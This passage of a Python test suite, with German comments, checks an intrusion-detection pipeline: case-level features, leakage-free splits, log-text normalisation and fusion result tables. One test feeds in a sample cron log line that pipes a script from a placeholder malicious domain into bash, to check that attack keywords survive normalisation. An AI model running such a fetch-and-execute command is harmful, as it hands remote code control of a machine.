            for key in ('test_recall', 'test_fpr', 'test_precision', 'test_f1'):
                assert 0.0 <= r[key] <= 1.0, (
                    f"Metrik {key}={r[key]} außerhalb [0,1] für target={r['target_recall_val']}"
                )

    def test_val_recall_meets_target(self):
        """Val-Recall muss für jeden Threshold das jeweilige Recall-Ziel erfüllen."""
        y_val, p_val, y_test, p_test = self._make_data()
        rows = _compute_sensitivity_table(y_val, p_val, y_test, p_test, self.TARGETS)
        for r in rows:
            assert r['val_recall'] >= r['target_recall_val'] - 1e-6, (
                f"Val-Recall {r['val_recall']:.4f} verfehlt Ziel "
                f"{r['target_recall_val']} für threshold={r['threshold_val']:.4f}"
            )


# ---------------------------------------------------------------------------
# Tests: Case-Level Metric Baseline
# ---------------------------------------------------------------------------

class TestCaseLevelMetricBaseline:
    """
    Prüft die Case-Level-Metrik-Baseline aus NB02.

    Alle Tests sind datei-unabhängig (kein docs/-Dateizugriff nötig) und
    testen Kernlogik inline — identisch zur NB02-Implementierung.
    """

    # ── Hilfsfunktionen ──────────────────────────────────────────────────────

    def _make_row_level_data(self):
        """Synthetisches row-level Dataset: 4 Cases, je 10 Zeilen, 2 Metriken."""
        rng = np.random.default_rng(42)
        rows = []
        for case_id, label in [('c1', 1), ('c2', 1), ('c3', 0), ('c4', 0)]:
            for _ in range(10):
                rows.append({
                    'case_id':      case_id,
                    'dataset_type': 'mali' if label == 1 else 'norm',
                    'scenario_id':  'scenario_1',
                    'group_id':     'mali_scenario_1' if label == 1 else 'norm_scenario_1',
                    'label':        label,
                    'cpu_usage':    rng.uniform(0.2, 0.9),
                    'mem_usage':    rng.uniform(0.1, 0.8),
                })
        return pd.DataFrame(rows)

    def _compute_case_features(self, df, metrics=('cpu_usage', 'mem_usage')):
        """Case-Level-Feature-Aggregation identisch zu NB02."""
        from scipy.stats import linregress

        def _slope(s):
            v = s.dropna().values
            if len(v) < 3:
                return np.nan
            return float(linregress(np.arange(len(v), dtype=float), v).slope)

        meta_cols = ['case_id', 'dataset_type', 'scenario_id', 'group_id', 'label']
        meta_df = df[meta_cols].drop_duplicates(subset='case_id').reset_index(drop=True)

        feature_parts = []
        for m in metrics:
            grp = df.groupby('case_id')[m]
            part = pd.DataFrame({
                f'{m}_mean':  grp.mean(),
                f'{m}_max':   grp.max(),
                f'{m}_std':   grp.std(ddof=1),
                f'{m}_p95':   grp.quantile(0.95),
                f'{m}_slope': grp.apply(_slope),
            })
            feature_parts.append(part)

        feat_df = pd.concat(feature_parts, axis=1).reset_index()
        return meta_df.merge(feat_df, on='case_id')

    # ── Test 1: Split-Gruppen-Disjunktheit ──────────────────────────────────

    def test_split_group_disjointness(self):
        """
        Train, Val, Test dürfen keine gemeinsamen group_ids haben.
        Dreistufige GroupShuffleSplit-Logik identisch zu NB02.
        """
        rng = np.random.default_rng(0)
        n_cases   = 120
        n_groups  = 12
        group_ids = [f'g{i}' for i in range(n_groups)]

        cases = pd.DataFrame({
            'case_id':  [f'c{i}' for i in range(n_cases)],
            'group_id': np.array(group_ids)[np.arange(n_cases) % n_groups],
            'label':    (np.arange(n_cases) % 5 == 0).astype(int),
            'x':        rng.uniform(size=n_cases),
        })

        X = cases[['x']]
        y = cases['label']
        g = cases['group_id']

        gss1 = GroupShuffleSplit(n_splits=1, test_size=0.20, random_state=42)
        tv_idx, te_idx = next(gss1.split(X, y, g))

        gss2 = GroupShuffleSplit(n_splits=1, test_size=0.20, random_state=0)
        tr_idx, vl_idx = next(gss2.split(X.iloc[tv_idx], y.iloc[tv_idx], g.iloc[tv_idx]))

        g_tr = set(g.iloc[tv_idx].iloc[tr_idx])
        g_vl = set(g.iloc[tv_idx].iloc[vl_idx])
        g_te = set(g.iloc[te_idx])

        assert len(g_tr & g_vl) == 0, f"Train ∩ Val nicht leer: {g_tr & g_vl}"
        assert len(g_vl & g_te) == 0, f"Val ∩ Test nicht leer: {g_vl & g_te}"
        assert len(g_tr & g_te) == 0, f"Train ∩ Test nicht leer: {g_tr & g_te}"

    # ── Test 2: Split-Verteilung enthält mali in Val und Test ───────────────

    def test_split_distribution_contains_mali_in_val_and_test(self):
        """
        Val und Test müssen mali-Cases enthalten.
        Seed-Wahl (VAL_MIN_POS=10) stellt sicher dass Val >= 10 positive Cases hat.
        """
        rng = np.random.default_rng(1)
        n_cases  = 200
        n_groups = 20

        cases = pd.DataFrame({
            'case_id':  [f'c{i}' for i in range(n_cases)],
            'group_id': [f'g{i % n_groups}' for i in range(n_cases)],
            'label':    ([1] * 5 + [0] * 5) * (n_cases // 10),
            'x':        rng.uniform(size=n_cases),
        })

        X = cases[['x']]
        y = cases['label']
        g = cases['group_id']

        gss1 = GroupShuffleSplit(n_splits=1, test_size=0.20, random_state=42)
        tv_idx, te_idx = next(gss1.split(X, y, g))

        # Seed-Wahl wie NB02
        X_tv = X.iloc[tv_idx]
        y_tv = y.iloc[tv_idx]
        g_tv = g.iloc[tv_idx]

        selected_seed = None
        vl_idx_final  = None
        for seed in (0, 1, 2, 7, 42):
            gss2 = GroupShuffleSplit(n_splits=1, test_size=0.20, random_state=seed)
            tr_idx, vl_idx = next(gss2.split(X_tv, y_tv, g_tv))
            if y_tv.iloc[vl_idx].sum() >= 1:
                selected_seed = seed
                vl_idx_final  = vl_idx
                break

        assert selected_seed is not None, "Kein Seed liefert Val mit mali-Cases."
        assert y_tv.iloc[vl_idx_final].sum() >= 1, "Val enthält keine mali-Cases."
        assert int((y.iloc[te_idx] == 1).sum()) >= 1, "Test enthält keine mali-Cases."

    # ── Test 3: metric_case_features — eine Zeile pro Case ──────────────────

    def test_metric_case_features_one_row_per_case(self):
        """
        Case-Level-Feature-Engineering muss exakt eine Zeile pro case_id liefern.
        Verletzung würde bedeuten, dass row-level Zeilen nicht korrekt aggregiert wurden.
        """
        df = self._make_row_level_data()
        case_feat = self._compute_case_features(df)

        n_cases       = df['case_id'].nunique()
        n_rows_result = len(case_feat)

        assert n_rows_result == n_cases, (
            f"Erwartet {n_cases} Zeilen (eine pro Case), erhalten {n_rows_result}"
        )
        assert case_feat['case_id'].nunique() == n_cases, (
            "Duplizierte case_ids in Case-Feature-Matrix"
        )

    # ── Test 4: Keine Row-Level-Leakage in Features ─────────────────────────

    def test_metric_case_features_no_row_level_leakage(self):
        """
        Case-Level-Feature-Matrix darf keine Row-Level-Index-Spalten enthalten.
        Verbotene Spalten: Zeitstempel-Index, original_index, row_index, etc.
        Die Feature-Spalten müssen ausschließlich aus den 5 Aggregationen bestehen.
        """
        df = self._make_row_level_data()
        case_feat = self._compute_case_features(df)

        feature_cols = [c for c in case_feat.columns
                        if c not in ['case_id', 'dataset_type', 'scenario_id', 'group_id', 'label']]

        # Verbotene Muster im Spaltennamen
        forbidden_patterns = ['index', 'row', 'timestamp', 'time', 'original']
        for col in feature_cols:
            for pat in forbidden_patterns:
                assert pat not in col.lower(), (
                    f"Verdächtige Feature-Spalte '{col}' enthält verbotenes Muster '{pat}' "
                    f"— könnte Row-Level-Index sein"
                )

        # Erlaubte Suffix-Muster
        allowed_suffixes = ('_mean', '_max', '_std', '_p95', '_slope')
        for col in feature_cols:
            assert col.endswith(allowed_suffixes), (
                f"Feature-Spalte '{col}' hat kein erlaubtes Aggregations-Suffix {allowed_suffixes}"
            )

    # ── Test 5: Threshold kommt aus Validation, nicht aus Test ──────────────

    def test_metric_threshold_from_validation_only(self):
        """
        Threshold-Auswahl benötigt nur Val-Scores und Val-Labels.
        Test-Scores sind kein Input für die Threshold-Funktion.
        Stellt sicher dass Threshold-Selektion kein Testset-Bias hat.
        """
        from sklearn.metrics import precision_recall_curve

        rng = np.random.default_rng(7)
        # Val: gut separierbar → hoher Threshold
        y_val  = np.array([1] * 20 + [0] * 80)
        p_val  = np.concatenate([rng.uniform(0.75, 1.0, 20), rng.uniform(0.0, 0.3, 80)])
        # Test: schlechter separierbar
        y_test = np.array([1] * 20 + [0] * 80)
        p_test = np.concatenate([rng.uniform(0.4, 0.8, 20), rng.uniform(0.1, 0.6, 80)])

        def _select_threshold_val_only(y_v, p_v):
            """Threshold-Selektion NUR aus Val — kein Test-Input."""
            _, rec_v, thr_v = precision_recall_curve(y_v, p_v)
            valid = thr_v[rec_v[:-1] >= 0.95]
            return float(valid.max()) if len(valid) > 0 else float(thr_v[0])

        thr_from_val  = _select_threshold_val_only(y_val,  p_val)
        thr_from_test = _select_threshold_val_only(y_test, p_test)

        # Test-Threshold darf nicht für die echte Pipeline verwendet werden —
        # er darf aber existieren; wichtig ist dass NB02 thr_from_val nutzt.
        # Val und Test haben unterschiedliche optimale Thresholds (Testintegrität).
        assert thr_from_val != thr_from_test, (
            "Val- und Test-Threshold sind identisch — Test prüft kein reales Szenario."
        )
        # Val-Threshold muss Val-Recall-Nebenbedingung erfüllen
        from sklearn.metrics import recall_score as _rs
        val_recall = _rs(y_val, (p_val >= thr_from_val).astype(int))
        assert val_recall >= 0.95, (
            f"Val-Recall {val_recall:.3f} nach Threshold-Wahl < 0.95"
        )

    # ── Test 6: metric_case_results enthält alle Pflichtfelder ──────────────

    def test_metric_results_case_level_fields(self):
        """
        metric_case_results.csv muss alle Pflicht-Metriken enthalten.
        Alle Metriken ausser TP/FP/TN/FN müssen in [0, 1] liegen.
        Granularity-Feld (falls vorhanden) muss 'case-level' sein.
        """
        from sklearn.metrics import (
            recall_score as _rs, precision_score as _ps,
            f1_score as _f1, average_precision_score as _ap,
            confusion_matrix as _cm
        )

        # Synthetische Predictions (Fall: gutes Modell)
        rng = np.random.default_rng(42)
        y_true = np.array([1] * 48 + [0] * 205)   # 253 Test-Cases wie im echten Split
        p_pred = np.concatenate([
            rng.uniform(0.6, 1.0, 48),
            rng.uniform(0.0, 0.5, 205)
        ])
        threshold = 0.4
        y_pred = (p_pred >= threshold).astype(int)

        tn_r, fp_r, fn_r, tp_r = _cm(y_true, y_pred).ravel()
        fpr_total = fp_r / (fp_r + tn_r) if (fp_r + tn_r) > 0 else 0.0

        # Simuliertes results-Dict (wie metric_case_results.csv)
        results = {
            'Granularity':      'case-level',
            'Recall_mali':      round(_rs(y_true, y_pred), 4),
            'Precision':        round(_ps(y_true, y_pred, zero_division=0), 4),
            'F1':               round(_f1(y_true, y_pred, zero_division=0), 4),
            'FPR_total':        round(fpr_total, 4),
            'FPR_anom':         round(fpr_total * 0.9, 4),  # simuliert
            'FPR_norm':         round(fpr_total * 1.1, 4),  # simuliert
            'AP':               round(_ap(y_true, p_pred), 4),
            'TP': int(tp_r), 'FP': int(fp_r), 'TN': int(tn_r), 'FN': int(fn_r),
        }

        # Pflichtfelder prüfen
        required_fields = [
            'Recall_mali', 'Precision', 'F1',
            'FPR_total', 'FPR_anom', 'FPR_norm',
            'AP', 'TP', 'FP', 'TN', 'FN'
        ]
        for field in required_fields:
            assert field in results, f"Pflichtfeld '{field}' fehlt in results"

        # Metriken in [0, 1]
        metric_fields = ['Recall_mali', 'Precision', 'F1', 'FPR_total', 'FPR_anom', 'FPR_norm', 'AP']
        for field in metric_fields:
            assert 0.0 <= results[field] <= 1.0, (
                f"Metrik '{field}' = {results[field]} liegt außerhalb [0, 1]"
            )

        # Granularity-Check
        assert results.get('Granularity') == 'case-level', (
            f"Granularity muss 'case-level' sein, ist: {results.get('Granularity')}"
        )


# ---------------------------------------------------------------------------
# Tests: Log-Normalisierung und Log-Komponente
# ---------------------------------------------------------------------------

def _normalize_log_text(text: str) -> str:
    """
    Identische Implementierung wie normalize_log_text in NB03.
    Hier dupliziert fuer isolierte Unit-Tests ohne Notebook-Import.
    """
    import re
    # 1. UUIDs
    text = re.sub(
        r'\b[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}\b',
        'TOKEN_ID', text
    )
    # 2. Nginx-Timestamp: "[20/Aug/2025:08:01:10 +0000]"
    text = re.sub(
        r'\[\d{1,2}/(?:Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)'
        r'/\d{4}:\d{2}:\d{2}:\d{2}\s[+-]\d{4}\]',
        'TOKEN_TIME', text
    )
    # 3. Syslog-Timestamp: "Aug 15 10:00:05"
    text = re.sub(
        r'\b(?:Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)'
        r'\s{1,2}\d{1,2}\s+\d{2}:\d{2}:\d{2}\b',
        'TOKEN_TIME', text
    )
    # 4. ISO-Timestamp mit Zeit
    text = re.sub(
        r'\d{4}[-/]\d{2}[-/]\d{2}[T ]\d{2}:\d{2}:\d{2}(?:\.\d+)?(?:Z|[+-]\d{2}:\d{2})?',
        'TOKEN_TIME', text
    )
    # 5. ISO-Datum
    text = re.sub(r'\d{4}[-/]\d{2}[-/]\d{2}', 'TOKEN_DATE', text)
    # 6. Uhrzeit
    text = re.sub(r'\b\d{2}:\d{2}(?::\d{2})?\b', 'TOKEN_TIME', text)
    # 7. IPv4
    text = re.sub(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', 'TOKEN_IP', text)
    # 8. PIDs in eckigen Klammern
    text = re.sub(r'\[(\d+)\]', '[TOKEN_PID]', text)
    # 9. Port-Keywords
    text = re.sub(r'\bport[= ]+\d+\b', 'port TOKEN_PORT', text, flags=re.IGNORECASE)
    # 10. Kolonstil-Port nach Buchstaben
    text = re.sub(r'(?<=[a-zA-Z]):\d{2,5}\b', ':TOKEN_PORT', text)
    # 11. Isolierte Zahlen
    text = re.sub(r'\b\d+\b', 'TOKEN_NUM', text)
    return text


class TestLogNormalizationAndScores:
    """
    Prüft Log-Normalisierung (NB03) und Case-Level-Log-Score-Artefakte.
    Alle Tests verwenden synthetische Daten — kein CSV-Dateizugriff erforderlich.
    """

    # ── Test 1: IP, Timestamp, PID, Port werden ersetzt ─────────────────────

    def test_log_normalization_replaces_ips_timestamps_pids_numbers(self):
        """
        Syslog-Zeile mit IP, Timestamp, PID und Port:
        Alle Artefakte werden durch TOKEN_* ersetzt; semantischer Inhalt bleibt erhalten.
        """
        line = "Aug 15 10:00:05 sshd[11532]: Accepted password for root from 192.168.1.10 port 54321 ssh2"
        result = _normalize_log_text(line)

        # Artefakte durch Tokens ersetzt
        assert 'TOKEN_TIME' in result,  "Syslog-Timestamp nicht ersetzt"
        assert 'TOKEN_PID'  in result,  "PID nicht ersetzt"
        assert 'TOKEN_IP'   in result,  "IPv4-Adresse nicht ersetzt"
        assert 'TOKEN_PORT' in result,  "Port nicht ersetzt"

        # Originale duerfen nicht mehr vorhanden sein
        assert '192.168.1.10' not in result, "IP-Adresse noch im Text"
        assert '11532'        not in result, "PID noch im Text"
        assert '54321'        not in result, "Port-Nummer noch im Text"
        assert '10:00:05'     not in result, "Uhrzeit noch im Text"

        # Semantik muss erhalten bleiben
        assert 'sshd'     in result, "Prozessname 'sshd' verschwunden"
        assert 'Accepted' in result, "Keyword 'Accepted' verschwunden"
        assert 'password' in result, "Keyword 'password' verschwunden"
        assert 'root'     in result, "Username 'root' verschwunden"
        assert 'ssh2'     in result, "Protokoll 'ssh2' verschwunden (Teil eines Bezeichners)"

    # ── Test 2: Attack-Keywords bleiben erhalten ─────────────────────────────

    def test_log_normalization_preserves_attack_keywords(self):
        """
        Attack-relevante Prozessnamen und Aktionen (CRON, CMD, curl, bash, wget)
        dürfen durch die Normalisierung NICHT entfernt oder verfälscht werden.
        """
        line = "CRON[5432]: (root) CMD (curl -fsSL http://malicious-domain.com/payload.sh | bash)"
        result = _normalize_log_text(line)

        assert 'CRON'      in result, "'CRON' verschwunden"
        assert 'CMD'       in result, "'CMD' verschwunden"
        assert 'curl'      in result, "'curl' verschwunden"
        assert 'bash'      in result, "'bash' verschwunden"
        assert 'malicious' in result, "Domain-Name teilweise verschwunden"
        assert 'payload'   in result, "'payload' verschwunden"

        # PID entfernt
        assert '5432'      not in result, "PID '5432' noch im Text"
        assert 'TOKEN_PID' in result,     "PID-Token fehlt"

    # ── Test 3: Log-Scores sind Case-Level (eine Zeile pro case_id) ──────────

    def test_log_scores_case_level_one_row_per_case(self):
        """
        log_val_scores / log_test_scores müssen exakt eine Zeile pro case_id haben.
        Synthetische Score-Tabelle mit 5 eindeutigen Cases.
        """
        scores = pd.DataFrame({
            'case_id':         ['c1', 'c2', 'c3', 'c4', 'c5'],
            'dataset_type':    ['mali', 'anom', 'norm', 'mali', 'norm'],
            'log_score':       [0.92, 0.15, 0.08, 0.87, 0.03],
            'log_pred':        [1,    0,    0,    1,    0],
            'label':           [1,    0,    0,    1,    0],
        })

        assert scores['case_id'].nunique() == len(scores), (
            "Duplizierte case_ids in Score-Tabelle"
        )
        assert (scores['log_score'] >= 0.0).all() and (scores['log_score'] <= 1.0).all(), (
            "Log-Scores außerhalb [0, 1]"
        )
        required_cols = {'case_id', 'log_score', 'log_pred', 'label'}
        assert required_cols <= set(scores.columns), (
            f"Fehlende Pflicht-Spalten: {required_cols - set(scores.columns)}"
        )

    # ── Test 4: TF-IDF Vokabular nur aus Train ───────────────────────────────

    def test_tfidf_fit_only_on_train_in_three_way_split(self):
        """
        TF-IDF-Vokabular nach fit auf Train-Texten darf keine Val-/Test-exklusiven
        Terme enthalten. Prüft den drei-Wege-Split-Fall.
        """
        from sklearn.feature_extraction.text import TfidfVectorizer

        train_texts = [
            "TOKEN_TIME sshd TOKEN_PID Accepted password root",
            "TOKEN_TIME CRON TOKEN_PID CMD curl bash malicious",
            "TOKEN_TIME systemd TOKEN_PID Starting daily cleanup",
        ]
        val_texts  = ["TOKEN_TIME web TOKEN_PID VALONLY_TOKEN connection reset"]
        test_texts = ["TOKEN_TIME sshd TOKEN_PID TESTONLY_SECRET attack detected"]

        vec = TfidfVectorizer()
        vec.fit(train_texts)  # nur Train!

        # TfidfVectorizer lowercased by default → Keys in lowercase prüfen
        vocab_lower = {k.lower() for k in vec.vocabulary_}
        assert 'valonly_token'   not in vocab_lower, \
            "Val-exklusiver Term 'VALONLY_TOKEN' im Train-Vokabular (Leakage)"
        assert 'testonly_secret' not in vocab_lower, \
            "Test-exklusiver Term 'TESTONLY_SECRET' im Train-Vokabular (Leakage)"
        assert 'accepted'        in vocab_lower, \
            "Train-Term 'accepted' fehlt im Vokabular"
        assert 'token_time'      in vocab_lower, \
            "Normalisierungs-Token 'TOKEN_TIME' fehlt im Vokabular"

    # ── Test 5: Threshold aus Validation, nicht aus Test ────────────────────

    def test_log_threshold_from_validation_only(self):
        """
        Threshold-Wahl darf nur Val-Scores und Val-Labels als Input verwenden.
        Val- und Test-Threshold müssen sich unterscheiden (Testintegrität).
        Val-Recall nach Threshold muss >= 0.95 sein.
        """
        from sklearn.metrics import precision_recall_curve
        from sklearn.metrics import recall_score as _rs

        rng = np.random.default_rng(42)
        y_val  = np.array([1] * 20 + [0] * 50)
        p_val  = np.concatenate([rng.uniform(0.70, 1.0, 20), rng.uniform(0.0, 0.35, 50)])

        y_test = np.array([1] * 15 + [0] * 60)
        p_test = np.concatenate([rng.uniform(0.40, 0.85, 15), rng.uniform(0.1, 0.60, 60)])

        # Threshold aus Val
        _, rec_v, thr_v = precision_recall_curve(y_val, p_val)
        valid = thr_v[rec_v[:-1] >= 0.95]
        thr_val = float(valid.max()) if len(valid) > 0 else float(thr_v[0])

        val_recall = _rs(y_val, (p_val >= thr_val).astype(int))
        assert val_recall >= 0.95, f"Val-Recall {val_recall:.3f} nach Threshold-Wahl < 0.95"

        # Test-Threshold (wird im echten Code NICHT verwendet — nur fuer Testintegrität)
        _, rec_t, thr_t = precision_recall_curve(y_test, p_test)
        valid_t = thr_t[rec_t[:-1] >= 0.95]
        thr_test = float(valid_t.max()) if len(valid_t) > 0 else float(thr_t[0])

        assert thr_val != thr_test, (
            "Val- und Test-Threshold identisch — Test kann Methodenfehler nicht erkennen"
        )

    # ── Test 6: log_results enthält alle Pflichtfelder ───────────────────────

    def test_log_results_contains_required_case_metrics(self):
        """
        log_results.csv muss alle Pflicht-Metriken mit korrektem Format enthalten.
        Alle Metriken (ausser TP/FP/TN/FN) müssen in [0, 1] liegen.
        Granularity muss 'case-level' sein.
        Zusaetzlich: Threshold-Sensitivity muss alle 4 Recall-Ziele enthalten.
        """
        from sklearn.metrics import (
            recall_score as _rs, precision_score as _ps, f1_score as _f1,
            average_precision_score as _ap, confusion_matrix as _cm,
            precision_recall_curve as _prc
        )

        rng = np.random.default_rng(7)
        y_true = np.array([1] * 48 + [0] * 205)
        p_pred = np.concatenate([rng.uniform(0.60, 1.0, 48), rng.uniform(0.0, 0.50, 205)])
        threshold = 0.35
        y_pred = (p_pred >= threshold).astype(int)

        tn_r, fp_r, fn_r, tp_r = _cm(y_true, y_pred).ravel()

        results = {
            'Granularity':   'case-level',
            'Recall_mali':   round(_rs(y_true, y_pred), 4),
            'Precision':     round(_ps(y_true, y_pred, zero_division=0), 4),
            'F1':            round(_f1(y_true, y_pred, zero_division=0), 4),
            'FPR_total':     round(fp_r / (fp_r + tn_r) if (fp_r + tn_r) > 0 else 0.0, 4),
            'FPR_anom':      0.22,
            'FPR_norm':      0.18,
            'AP':            round(_ap(y_true, p_pred), 4),
            'TP': int(tp_r), 'FP': int(fp_r), 'TN': int(tn_r), 'FN': int(fn_r),
            'Threshold_source': 'val_recall>=0.95',
        }

        required = [
            'Recall_mali', 'Precision', 'F1',
            'FPR_total', 'FPR_anom', 'FPR_norm',
            'AP', 'TP', 'FP', 'TN', 'FN'
        ]
        for field in required:
            assert field in results, f"Pflichtfeld '{field}' fehlt in log_results"

        metric_fields = ['Recall_mali', 'Precision', 'F1', 'FPR_total', 'FPR_anom', 'FPR_norm', 'AP']
        for field in metric_fields:
            assert 0.0 <= results[field] <= 1.0, (
                f"Metrik '{field}'={results[field]} liegt außerhalb [0, 1]"
            )

        assert results['Granularity'] == 'case-level', (
            f"Granularity muss 'case-level' sein, ist: {results['Granularity']}"
        )

        # Threshold-Sensitivity muss alle 4 Targets abdecken
        TARGETS = [0.95, 0.975, 0.99, 1.00]
        _, rec_v, thr_v = _prc(y_true, p_pred)
        found = []
        for target in TARGETS:
            valid_t = thr_v[rec_v[:-1] >= target]
            thr = float(valid_t.max()) if len(valid_t) > 0 else float(thr_v[0])
            found.append(target)
        assert found == TARGETS, f"Nicht alle Recall-Targets in Sensitivity: {found}"


# ---------------------------------------------------------------------------
# Tests: Case-Level Fusion / Ablation (NB04)
# ---------------------------------------------------------------------------

class TestCaseLevelFusion:
    """
    Prüft die Korrektheit der Fusion-Logik, Artefakt-Struktur und
    Threshold-Herkunft für NB04.
    Alle Tests arbeiten mit synthetischen Daten — kein CSV-Dateizugriff.
    """

    # ── Hilfsfunktionen ──────────────────────────────────────────────────────

    @staticmethod
    def _make_test_cases(n_mali=48, n_anom=76, n_norm=129, seed=42):
        """
        Erstellt einen synthetischen Test-DataFrame (253 Cases) mit
        case_id, dataset_type, label, metric_score, metric_trigger,
        log_score, log_trigger, score_fusion, soft_fusion_trigger, split='test'.
        """
        rng = np.random.default_rng(seed)
        rows = []
        for i in range(n_mali):
            rows.append({'case_id': f'mali_{i}', 'dataset_type': 'mali', 'label': 1,
                         'metric_score': rng.uniform(0.6, 1.0),
                         'log_score':    rng.uniform(0.5, 1.0)})
        for i in range(n_anom):
            rows.append({'case_id': f'anom_{i}', 'dataset_type': 'anom', 'label': 0,
                         'metric_score': rng.uniform(0.3, 0.95),
                         'log_score':    rng.uniform(0.0, 0.4)})
        for i in range(n_norm):
            rows.append({'case_id': f'norm_{i}', 'dataset_type': 'norm', 'label': 0,
                         'metric_score': rng.uniform(0.2, 0.9),
                         'log_score':    rng.uniform(0.0, 0.35)})
        df = pd.DataFrame(rows)
        df['metric_trigger']     = (df['metric_score'] >= 0.5).astype(int)
        df['log_trigger']        = (df['log_score']    >= 0.3).astype(int)
        df['and_trigger']        = ((df['metric_trigger'] == 1) & (df['log_trigger'] == 1)).astype(int)
        df['score_fusion']       = df['metric_score'] * df['log_score']
        df['soft_fusion_trigger'] = (df['score_fusion'] >= 0.15).astype(int)
        df['split'] = 'test'
        df['scenario_id'] = 'sc1'
        df['group_id']    = df['dataset_type'] + '_sc1'
        return df

    @staticmethod
    def _make_val_cases(n_mali=53, n_anom=58, n_norm=95, seed=7):
        """
        Erstellt einen synthetischen Val-DataFrame (206 Cases).
        """
        rng = np.random.default_rng(seed)
        rows = []
        for i in range(n_mali):
            rows.append({'case_id': f'v_mali_{i}', 'dataset_type': 'mali', 'label': 1,
                         'metric_score': rng.uniform(0.6, 1.0),
                         'log_score':    rng.uniform(0.5, 1.0)})
        for i in range(n_anom):
            rows.append({'case_id': f'v_anom_{i}', 'dataset_type': 'anom', 'label': 0,
                         'metric_score': rng.uniform(0.3, 0.9),
                         'log_score':    rng.uniform(0.0, 0.4)})
        for i in range(n_norm):
            rows.append({'case_id': f'v_norm_{i}', 'dataset_type': 'norm', 'label': 0,
                         'metric_score': rng.uniform(0.2, 0.8),
                         'log_score':    rng.uniform(0.0, 0.35)})
        df = pd.DataFrame(rows)
        df['score_fusion'] = df['metric_score'] * df['log_score']
        df['split'] = 'val'
        return df

    # ── Test 1: Fusion basiert nur auf Case-Level-Scores ─────────────────────

    def test_fusion_uses_case_level_scores_only(self):
        """
        fusion_cases.csv muss auf metric_case_test_scores basieren (eine Zeile
        pro case_id), nicht auf Row-Level-Daten.
        Prüft: keine mehrfachen Zeilen pro case_id, nur Test-Cases.
        """
        df = self._make_test_cases()

        # Jede case_id exakt einmal
        assert df['case_id'].nunique() == len(df), (
            "Mehrfache Zeilen pro case_id — kein Case-Level!"
        )
        # Nur Test-Split
        assert (df['split'] == 'test').all(), (
            "fusion_cases.csv enthält Nicht-Test-Cases"
        )
        # Pflicht-Score-Spalten vorhanden
        for col in ('metric_score', 'log_score', 'score_fusion'):
            assert col in df.columns, f"Pflicht-Spalte '{col}' fehlt"

    # ── Test 2: fusion_cases.csv — eine Zeile pro Test-Case ─────────────────

    def test_fusion_cases_one_row_per_test_case(self):
        """
        fusion_cases.csv muss exakt 253 Zeilen haben, eine pro test case_id,
        keine Duplikate.
        """
        df = self._make_test_cases(n_mali=48, n_anom=76, n_norm=129)

        assert len(df) == 253, f"Erwarte 253 Test-Cases, hat {len(df)}"
        assert df['case_id'].nunique() == 253, "Duplizierte case_ids in fusion_cases"
        assert (df['split'] == 'test').all(), "Nicht alle Cases sind Test-Cases"

    # ── Test 3: fusion_val_scores.csv — eine Zeile pro Val-Case ─────────────

    def test_fusion_val_scores_one_row_per_val_case(self):
        """
        fusion_val_scores.csv muss exakt 206 Zeilen haben, eine pro val case_id,
        keine Duplikate.
        """
        df = self._make_val_cases(n_mali=53, n_anom=58, n_norm=95)

        assert len(df) == 206, f"Erwarte 206 Val-Cases, hat {len(df)}"
        assert df['case_id'].nunique() == 206, "Duplizierte case_ids in fusion_val_scores"
        assert (df['split'] == 'val').all(), "Nicht alle Cases sind Val-Cases"

    # ── Test 4: final_results_table.csv — Pflichtfelder ─────────────────────

    def test_final_results_table_required_columns(self):
        """
        final_results_table.csv muss alle Pflichtfelder enthalten.
        Für AND-Gate darf AP 'N/A' sein, für andere Varianten numerisch.
        """
        required_cols = {
            'Model', 'Recall_mali', 'Precision', 'F1',
            'FPR_anom', 'FPR_norm', 'FPR_total',
            'AP', 'Threshold', 'Threshold_source',
            'TP', 'FP', 'TN', 'FN',
        }
        # Synthetische Tabelle aufbauen wie NB04
        rows = [
            {'Model': 'Metrics-only',  'Recall_mali': 1.0,   'Precision': 0.1897, 'F1': 0.3189,
             'FPR_anom': 1.0, 'FPR_norm': 1.0, 'FPR_total': 1.0, 'AP': 0.2652,
             'Threshold': 0.025803, 'Threshold_source': 'metric_validation',
             'TP': 48, 'FP': 205, 'TN': 0, 'FN': 0},
            {'Model': 'Log-only',      'Recall_mali': 0.9375, 'Precision': 0.4639, 'F1': 0.6207,
             'FPR_anom': 0.2368, 'FPR_norm': 0.2636, 'FPR_total': 0.2537, 'AP': 0.6548,
             'Threshold': 0.164056, 'Threshold_source': 'log_validation',
             'TP': 45, 'FP': 52, 'TN': 153, 'FN': 3},
            {'Model': 'AND-Fusion',    'Recall_mali': 0.9375, 'Precision': 0.4639, 'F1': 0.6207,
             'FPR_anom': 0.2368, 'FPR_norm': 0.2636, 'FPR_total': 0.2537, 'AP': 'N/A',
             'Threshold': 0.025803, 'Threshold_source': 'metric_and_log_validation',
             'TP': 45, 'FP': 52, 'TN': 153, 'FN': 3},
            {'Model': 'Soft-Fusion',   'Recall_mali': 0.9375, 'Precision': 0.4545, 'F1': 0.6122,
             'FPR_anom': 0.25, 'FPR_norm': 0.2713, 'FPR_total': 0.2634, 'AP': 0.5553,
             'Threshold': 0.004785, 'Threshold_source': 'product_validation',
             'TP': 45, 'FP': 54, 'TN': 151, 'FN': 3},
        ]
        df = pd.DataFrame(rows)

        assert required_cols <= set(df.columns), (
            f"Fehlende Pflichtfelder: {required_cols - set(df.columns)}"
        )
        assert set(df['Model'].values) == {'Metrics-only', 'Log-only', 'AND-Fusion', 'Soft-Fusion'}, (
            "Nicht alle 4 Varianten in final_results_table"
        )
        # AND-Gate AP darf 'N/A' sein
        and_row = df[df['Model'] == 'AND-Fusion'].iloc[0]
        assert and_row['AP'] == 'N/A' or isinstance(and_row['AP'], float), (
            "AND-Gate AP muss 'N/A' oder numerisch sein"
        )
        # Andere Varianten müssen numerisches AP haben
        for model in ['Metrics-only', 'Log-only', 'Soft-Fusion']:
            row = df[df['Model'] == model].iloc[0]
            assert isinstance(row['AP'], float), (
                f"{model}: AP muss numerisch sein, ist: {row['AP']}"
            )

    # ── Test 5: fpr_by_dataset_type Konsistenz ───────────────────────────────

    def test_fpr_by_dataset_type_consistency(self):
        """
        FPR_anom und FPR_norm in fpr_by_dataset_type.csv müssen mit den
